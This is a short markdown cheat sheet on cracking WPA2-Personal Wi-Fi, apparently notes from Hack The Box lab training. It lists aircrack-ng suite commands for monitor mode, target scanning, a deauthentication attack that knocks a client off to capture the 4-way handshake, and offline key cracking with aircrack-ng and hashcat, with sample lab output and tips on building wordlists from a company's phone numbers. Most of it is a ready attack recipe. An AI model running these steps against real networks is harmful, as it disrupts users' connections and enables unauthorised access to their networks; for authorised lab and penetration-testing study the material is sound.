# Hacking Wifi

## WPA2 Personal
### Notes
Custom wordlist - Company name, all phone numbers, company info
Run all possible combinations of phone numbers

# Traditional Attack
## Aircrack
### Recon
Put the correct wifi adapter in monitor mode:

```bash
# Monitor mode
airmon-ng start <wlan adapter>
```

You may need to kill some services that are using the adapter, as airmon-ng needs exclusive access to the adapter:
```bash
airmon-ng check kill
```

Use `airodump-ng` to scan for targets
* This will list all access points and their clients.
```bash
airodump-ng <wlan adapter mon>
```
* We can use `-c 1` to set the channel, and `-w` to save the results to a file, and `--bssid` to narrow down the access point.
```bash
airodump-ng -c <channel> --bssid <mac> -w <cap file> <ifacemon>
```
```bash
Chvxt3r@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WPA

21:58:02  Created capture file "WPA-01.cap".

 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 80:2D:BF:FE:13:83  -47 100      471       10    0   1   54   WPA2 CCMP   PSK  HackTheBox                                                    

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 80:2D:BF:FE:13:83  8A:00:A9:9B:ED:1A  -29    1 - 5      0      656  EAPOL  HackTheBox
```
>Note: `BSSID` is the mac of the AP, and `station` is the mac of a client

## Handshake Capture
### Deauth Attack
In order to capture the 4-way handshake, we need to deauth a client so it can reauth to the AP.
```bash
aireplay-ng -0 1 -a <mac of AP> -c <mac of client> <ifacemon>
```
```bash
# Example:
aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0mon

21:58:33  Waiting for beacon frame (BSSID: 80:2D:BF:FE:13:83) on channel 1
21:58:33  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:33  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:34  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:35  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:35  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]

```

Looking at airodump-ng, we see in the notes column that it's captured the handshake
```bash
Example:
airodump-ng wlan0mon -c 1 -w WPA

21:58:02  Created capture file "WPA-01.cap".


 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ][ WPA handshake: 80:2D:BF:FE:13:83 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 80:2D:BF:FE:13:83  -47 100      471       10    0   1   54   WPA2 CCMP   PSK  HackTheBox                                                    

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 80:2D:BF:FE:13:83  8A:00:A9:9B:ED:1A  -29    1 - 5      0      656  EAPOL  HackTheBox

```

# Crack the key
aircrack-ng -w <wordlist> -b <AP Mac Address> <capturefile .cap>
```

## Password Cracking
### Using hashcat
We need to extract the hash from our capture file, for `hashcat` we `hcxpcapngtool`
```bash
hcxpcapngtool -o <output file> <cap,pcap,pcapng>
```

To crack our new hash, we use mode `-m 22000`
```bash
hashcat -m 22000 --force <hash_file> <wordlist>
```
Once it's done, We can run the same command with `-show` to see the results
